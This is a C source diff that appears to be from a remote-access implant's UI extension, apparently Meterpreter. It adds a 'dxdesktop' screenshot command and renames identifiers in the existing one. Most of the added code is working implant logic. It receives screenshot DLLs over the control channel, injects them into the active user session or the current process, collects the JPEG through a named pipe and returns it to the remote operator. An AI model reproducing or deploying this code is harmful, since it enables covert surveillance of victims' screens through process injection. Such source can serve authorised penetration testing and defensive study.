@@ -373,7 +373,7 @@ DWORD THREADCALL desktop_screenshot_thread(THREAD * thread)
 				dwTotal += dwRead;
 			}
 
-			dwResult = packet_add_tlv_raw(response, TLV_TYPE_DESKTOP_SCREENSHOT, pBuffer, dwTotal);
+			dwResult = packet_add_tlv_raw(response, TLV_TYPE_DXDESKTOP_SCREENSHOT, pBuffer, dwTotal);
 
 			break;
 		}
@@ -419,7 +419,7 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 			BREAK_WITH_ERROR("[UI] desktop_screenshot. packet_create_response failed", ERROR_INVALID_HANDLE);
 		}
 
-		quality = packet_get_tlv_value_uint(request, TLV_TYPE_DESKTOP_SCREENSHOT_QUALITY);
+		quality = packet_get_tlv_value_uint(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_QUALITY);
 		if (quality < 1 || quality > 100)
 		{
 			quality = 50;
@@ -428,11 +428,11 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		// get the x86 and x64 screenshot dll's. we are not obliged to send both but we reduce the number of processes
 		// we can inject into (wow64 and x64) if we only send one type on an x64 system. If we are on an x86 system
 		// we dont need to send the x64 screenshot dll as there will be no x64 processes to inject it into.
-		DllBuffer.dwPE32DllLenght = packet_get_tlv_value_uint(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_LENGTH);
-		DllBuffer.lpPE32DllBuffer = packet_get_tlv_value_string(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE32DLL_BUFFER);
+		DllBuffer.dwPE32DllLenght = packet_get_tlv_value_uint(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE32DLL_LENGTH);
+		DllBuffer.lpPE32DllBuffer = packet_get_tlv_value_string(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE32DLL_BUFFER);
 
-		DllBuffer.dwPE64DllLenght = packet_get_tlv_value_uint(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_LENGTH);
-		DllBuffer.lpPE64DllBuffer = packet_get_tlv_value_string(request, TLV_TYPE_DESKTOP_SCREENSHOT_PE64DLL_BUFFER);
+		DllBuffer.dwPE64DllLenght = packet_get_tlv_value_uint(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE64DLL_LENGTH);
+		DllBuffer.lpPE64DllBuffer = packet_get_tlv_value_string(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE64DLL_BUFFER);
 
 		if (!DllBuffer.lpPE32DllBuffer && !DllBuffer.lpPE64DllBuffer)
 		{
@@ -502,6 +502,252 @@ DWORD request_ui_desktop_screenshot(Remote * remote, Packet * request)
 		if (!GetExitCodeThread(pPipeThread->handle, &dwResult))
 		{
 			BREAK_WITH_ERROR("[UI] desktop_screenshot. GetExitCodeThread failed", ERROR_INVALID_HANDLE);
+		}
+
+	} while (0);
+
+	if (response)
+	{
+		packet_transmit_response(dwResult, remote, response);
+	}
+
+	if (pPipeThread)
+	{
+		thread_sigterm(pPipeThread);
+		thread_join(pPipeThread);
+		thread_destroy(pPipeThread);
+	}
+
+	return dwResult;
+}
+
+
+/* new stuff below here */
+
+/*
+ * Worker thread for desktop screenshot. Creates a named pipe and reads in the 
+ * screenshot for the first client which connects to it.
+ */
+DWORD THREADCALL dxdesktop_screenshot_thread(THREAD * thread)
+{
+	DWORD dwResult = ERROR_ACCESS_DENIED;
+	HANDLE hServerPipe = NULL;
+	HANDLE hToken = NULL;
+	char * cpNamedPipe = NULL;
+	Packet * response = NULL;
+	BYTE * pBuffer = NULL;
+	DWORD dwRead = 0;
+	DWORD dwLength = 0;
+	DWORD dwTotal = 0;
+
+	do
+	{
+		if (!thread)
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot_thread. invalid thread", ERROR_BAD_ARGUMENTS);
+		}
+
+		cpNamedPipe = (char *)thread->parameter1;
+		response = (Packet *)thread->parameter2;
+
+		if (!cpNamedPipe || !response)
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot_thread. invalid thread arguments", ERROR_BAD_ARGUMENTS);
+		}
+
+		dprintf("[UI] dxdesktop_screenshot_thread. cpNamedPipe=%s", cpNamedPipe);
+
+		// create the named pipe for the client service to connect to
+		hServerPipe = CreateNamedPipe(cpNamedPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, NULL);
+		if (!hServerPipe)
+		{
+			BREAK_ON_ERROR("[UI] dxdesktop_screenshot_thread. CreateNamedPipe failed");
+		}
+
+		while (TRUE)
+		{
+			if (event_poll(thread->sigterm, 0))
+			{
+				BREAK_WITH_ERROR("[UI] dxdesktop_screenshot_thread. thread->sigterm received", ERROR_DBG_TERMINATE_THREAD);
+			}
+
+			// wait for a client to connect to our named pipe...
+			if (!ConnectNamedPipe(hServerPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED)
+			{
+				continue;
+			}
+
+			dprintf("[UI] dxdesktop_screenshot_thread. got client conn.");
+
+			if (!ReadFile(hServerPipe, &dwLength, sizeof(DWORD), &dwRead, NULL))
+			{
+				BREAK_ON_ERROR("[UI] dxdesktop_screenshot_thread. ReadFile 1 failed");
+			}
+
+			// a client can send a zero length to indicate that it cant get a screenshot.
+			if (!dwLength)
+			{
+				BREAK_WITH_ERROR("[UI] dxdesktop_screenshot_thread. dwLength == 0", ERROR_BAD_LENGTH);
+			}
+
+			pBuffer = (BYTE *)malloc(dwLength);
+			if (!pBuffer)
+			{
+				BREAK_WITH_ERROR("[UI] dxdesktop_screenshot_thread. pBuffer malloc failed", ERROR_NOT_ENOUGH_MEMORY);
+			}
+
+			while (dwTotal < dwLength)
+			{
+				DWORD dwAvailable = 0;
+
+				if (!PeekNamedPipe(hServerPipe, NULL, 0, NULL, &dwAvailable, NULL))
+				{
+					break;
+				}
+
+				if (!dwAvailable)
+				{
+					Sleep(100);
+					continue;
+				}
+
+				if (!ReadFile(hServerPipe, (LPVOID)(pBuffer + dwTotal), (dwLength - dwTotal), &dwRead, NULL))
+				{
+					break;
+				}
+
+				dwTotal += dwRead;
+			}
+
+			dwResult = packet_add_tlv_raw(response, TLV_TYPE_DXDESKTOP_SCREENSHOT, pBuffer, dwTotal);
+
+			break;
+		}
+
+	} while (0);
+
+	if (hServerPipe)
+	{
+		DisconnectNamedPipe(hServerPipe);
+		CLOSE_HANDLE(hServerPipe);
+	}
+
+	SAFE_FREE(pBuffer);
+
+	dprintf("[UI] dxdesktop_screenshot_thread finishing, dwResult=%d", dwResult);
+
+	return dwResult;
+}
+
+/*
+ * Take a screenshot of the desktop and transmit the image (in JPEG format) back to the client.
+ */
+DWORD request_ui_dxdesktop_screenshot(Remote * remote, Packet * request)
+{
+	DWORD dwResult = ERROR_SUCCESS;
+	Packet * response = NULL;
+	THREAD * pPipeThread = NULL;
+	LPVOID lpDllBuffer = NULL;
+	DLL_BUFFER DllBuffer = { 0 };
+	char cNamedPipe[MAX_PATH] = { 0 };
+	char cCommandLine[MAX_PATH] = { 0 };
+	int quality = 0;
+	DWORD dwDllLength = 0;
+	DWORD dwPipeName = 0;
+	DWORD dwCurrentSessionId = 0;
+	DWORD dwActiveSessionId = 0;
+
+	do
+	{
+		response = packet_create_response(request);
+		if (!response)
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. packet_create_response failed", ERROR_INVALID_HANDLE);
+		}
+
+		quality = packet_get_tlv_value_uint(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_QUALITY);
+		if (quality < 1 || quality > 100)
+		{
+			quality = 50;
+		}
+
+		// get the x86 and x64 screenshot dll's. we are not obliged to send both but we reduce the number of processes
+		// we can inject into (wow64 and x64) if we only send one type on an x64 system. If we are on an x86 system
+		// we dont need to send the x64 screenshot dll as there will be no x64 processes to inject it into.
+		DllBuffer.dwPE32DllLenght = packet_get_tlv_value_uint(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE32DLL_LENGTH);
+		DllBuffer.lpPE32DllBuffer = packet_get_tlv_value_string(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE32DLL_BUFFER);
+
+		DllBuffer.dwPE64DllLenght = packet_get_tlv_value_uint(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE64DLL_LENGTH);
+		DllBuffer.lpPE64DllBuffer = packet_get_tlv_value_string(request, TLV_TYPE_DXDESKTOP_SCREENSHOT_PE64DLL_BUFFER);
+
+		if (!DllBuffer.lpPE32DllBuffer && !DllBuffer.lpPE64DllBuffer)
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. Invalid dll arguments, at least 1 dll must be supplied", ERROR_BAD_ARGUMENTS);
+		}
+
+		// get the session id that our host process belongs to
+		dwCurrentSessionId = session_id(GetCurrentProcessId());
+
+		// get the session id for the interactive session
+		dwActiveSessionId = session_activeid();
+
+		// create a uniuqe pipe name for our named pipe server
+		dwPipeName = GetTickCount();
+
+		_snprintf(cNamedPipe, MAX_PATH, "\\\\.\\pipe\\%08X", dwPipeName);
+
+		// create the commandline to pass to the screenshot dll when we inject it
+		_snprintf(cCommandLine, MAX_PATH, "/s /q:%d /p:0x%08X\x00", quality, dwPipeName);
+
+		dprintf("[UI] dxdesktop_screenshot. dwCurrentSessionId=%d, dwActiveSessionId=%d, cCommandLine=%s\n", dwCurrentSessionId, dwActiveSessionId, cCommandLine);
+
+		// start a thread to create a named pipe server and wait for a client to connect an send back the JPEG screenshot.
+		pPipeThread = thread_create(dxdesktop_screenshot_thread, &cNamedPipe, response, NULL);
+		if (!pPipeThread)
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. thread_create failed", ERROR_INVALID_HANDLE);
+		}
+
+		if (!thread_run(pPipeThread))
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. thread_run failed", ERROR_ACCESS_DENIED);
+		}
+
+		Sleep(500);
+
+		// do the local process or session injection
+		if (dwCurrentSessionId != dwActiveSessionId)
+		{
+			dprintf("[UI] dxdesktop_screenshot. Injecting into active session %d...\n", dwActiveSessionId);
+			if (session_inject(dwActiveSessionId, &DllBuffer, cCommandLine) != ERROR_SUCCESS)
+			{
+				BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. session_inject failed", ERROR_ACCESS_DENIED);
+			}
+		}
+		else
+		{
+			dprintf("[UI] dxdesktop_screenshot. Allready in the active session %d.\n", dwActiveSessionId);
+			if (ps_inject(GetCurrentProcessId(), &DllBuffer, cCommandLine) != ERROR_SUCCESS)
+			{
+				BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. ps_inject current process failed", ERROR_ACCESS_DENIED);
+			}
+		}
+
+		// Wait for at most 30 seconds for the screenshot to happen...
+		// If we have injected our code via APC injection, it may take a while for the target
+		// thread to enter an alertable state and get our queued APC executed.
+		WaitForSingleObject(pPipeThread->handle, 30000);
+
+		// signal our thread to terminate if it is still running.
+		thread_sigterm(pPipeThread);
+
+		// and wait for it to terminate...
+		thread_join(pPipeThread);
+
+		// get the exit code for our pthread
+		if (!GetExitCodeThread(pPipeThread->handle, &dwResult))
+		{
+			BREAK_WITH_ERROR("[UI] dxdesktop_screenshot. GetExitCodeThread failed", ERROR_INVALID_HANDLE);
 		}
 
 	} while (0);
